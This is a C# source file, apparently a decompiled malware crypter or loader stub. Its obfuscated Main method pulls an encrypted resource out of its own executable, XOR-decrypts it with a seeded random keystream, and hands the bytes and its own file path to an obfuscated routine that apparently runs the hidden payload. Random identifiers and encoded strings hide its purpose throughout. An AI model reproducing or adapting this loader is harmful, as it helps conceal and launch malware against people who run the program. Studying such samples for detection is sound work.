using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace adudule;

[StandardModule]
internal sealed class PFkttswibiNZZosvnMbUEloJlpEOjwjWxUSuctfjJjuo
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	public static void Main()
	{
		string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref moduleName);
		IntPtr hResInfo = FindResource(moduleHandleA, EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|70|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|104|106|117|104|89|90|87|106|87|"));
		IntPtr source = LoadResource(moduleHandleA, hResInfo);
		int num = SizeofResource(moduleHandleA, hResInfo);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			Marshal.Copy(source, array, 0, num);
			int seed = BitConverter.ToInt32(array, array.Length - 4);
			array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1]);
			Random random = new Random(seed);
			byte[] array2 = new byte[array.Length - 1 + 1];
			random.NextBytes(array2);
			int num2 = array.Length - 1;
			int num3 = 0;
			while (true)
			{
				int num4 = num3;
				int num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				array[num3] = unchecked((byte)(array[num3] ^ array2[num3]));
				num3++;
			}
			pGJMEcrkUDFZCHURzNmmOWjLeKizazLFXHdNYealDRZa.kIDghOVnvlRMNLQBIPfHGWMPGfInkTHcSJXhQQDDemzb(array, Process.GetCurrentProcess().MainModule!.FileName);
		}
	}
}
